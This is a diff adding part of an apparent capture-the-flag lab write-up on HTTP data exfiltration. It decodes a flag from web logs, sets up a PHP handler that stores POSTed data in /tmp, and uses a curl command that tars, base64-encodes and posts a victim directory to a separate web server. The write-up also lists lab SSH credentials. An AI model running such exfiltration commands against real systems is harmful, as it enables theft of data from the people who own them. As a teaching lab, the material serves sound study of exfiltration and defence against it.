@@ -178,3 +178,91 @@ sudo cat /var/log/apache2/access.log
 # 192.168.0.133 - - [29/Apr/2022:11:41:54 +0100] "GET /example.php?flag=VEhNe0g3N1AtRzM3LTE1LWYwdW42fQo= HTTP/1.1" 200 495 "-" "curl/7.68.0"
 # 192.168.0.133 - - [29/Apr/2022:11:42:14 +0100] "POST /example.php HTTP/1.1" 200 395 "-" "curl/7.68.0"
 ```
+The first line is a **GET** request which includes a `file` parameter with exfiltrated data. If we decode this data, we will get the 🚩 required for the first question. The second line is a **POST** request to `/example.php`, in which we sent the same `base64` encoded data, but it does not show what data was transmitted. 
+
+We can decode the data as follows:
+
+```shell
+echo "VEhNe0g3N1AtRzM3LTE1LWYwdW42fQo=" > encoded-data.txt
+base64 -d encoded-data.txt
+# THM{$$$$-$$$-$$-$$$$$}
+```
+
+The steps to perform HTTP exfiltration are:
+1. We need an HTTP webserver with a data handler (a PHP page that handles the POST request sent to the server). In our case, `web.thm.com` and `contact.php`, respectively.
+2. We also need a method to send the data; we will send it via `curl`.
+3. A way to receive and store the data; `contact.php` will receive the POST request and store it under the `/tmp` directory.
+4. Once the data is stored, we will log into the web server and grab it.
+
+As mentioned on step 1, we already have a web server with a data handler available. The PHP code of `contact.php` can be shown below:
+
+```php
+<?php 
+if (isset($_POST['file'])) {
+        $file = fopen("/tmp/http.bs64","w");
+        fwrite($file, $_POST['file']);
+        fclose($file);
+   }
+?>
+```
+
+The above PHP script will handle POST requests via the `file` parameter and store the received data in the `/tmp` directory as `http.bs64`.
+
+1. Now, from the JumpBox machine, we can connect via SSH to `victim1.thm.com`:
+
+    ```shell
+    ssh thm@victim1.thm.com
+    # password: tryhackme
+    ```
+
+2. Our goal is to transfer the `/home/thm/task6`'s content:
+
+    ```shell
+    curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
+    ```
+
+    Let's break down the command:
+    1. `curl` This is the command-line utility used to transfer data to or from a server using various supported protocols. In this case, we are using it for an **HTTP POST request**.
+    2. `--data "file=$(tar zcf - task6 | base64)"` This part of the command specifies the data to be included in the HTTP POST request. It's using the `--data` option to send data. The data is enclosed in double quotes.
+    3. `file=$(tar zcf - task6 | base64)` This is the data being sent in the POST request. It's a combination of several commands which we have used before. In brief, it creates a compressed tarball of the `task6` directory and `base64` encodes it, making it suitable for transmission in a POST request.
+        - `$(...)` This is **command substitution**. It allows the output of the enclosed command sequence, in this case, the Base64-encoded tarball, to be used as a string within the `--data` parameter.
+    4. `http://web.thm.com/contact.php` This part of the command specifies the URL to which the HTTP POST request will be sent. It's making a POST request to the `contact.php` script on the `web.thm.com` web server.
+
+3. We can use the Jumpbox to log into `web.thm.com` and check if the data are located under `/tmp`:
+
+    ```shell
+    ls /tmp
+    # http.bs64
+    ```
+
+    Although we have managed to transfer the data, if we take a closer look, it is broken base64:
+
+    ![Broken base64 data](url-encoding.png)
+
+    This is due to **URL encoding** over HTTP. The `+` symbold got replaced with spaces. We can fix that using `sed`:
+
+    ```shell
+    sudo sed -i 's/ /+/g' /tmp/http.bs64
+    ```
+
+    The provided command uses the **stream editor** utility, `sed`, to make in-place replacements in a text file located at `/tmp/http.bs64`:
+
+    1. `sed` This is a stream editor used to perform basic text transformations on an input stream (a file or data provided via a pipe).
+
+    2. `-i` This is an option for sed, which indicates that it should edit the file in place.
+
+    3. `'s/ /+/g'` This is the sed command to perform the text transformation. It's written in the form of a **substitution command**. Here's what each part does:
+        - `s` This indicates that it's a substitution operation.
+        - `/` This character separates the search pattern from the replacement pattern.
+        - `/ /` This is the search pattern. It's looking for spaces.
+        - `+` This is the replacement pattern. It replaces spaces with plus symbols.
+        - `g` This is a flag that specifies that the substitution should be performed globally in the file (i.e., on all occurrences of the search pattern, not just the first one).
+
+    4. `/tmp/http.bs64` This is the path to the file on which sed will operate.
+
+4. Finally, we need to decode the data:
+
+    ```shell
+    base64 -d /tmp/http.bs64 | tar xvfz -
+    ```
+    
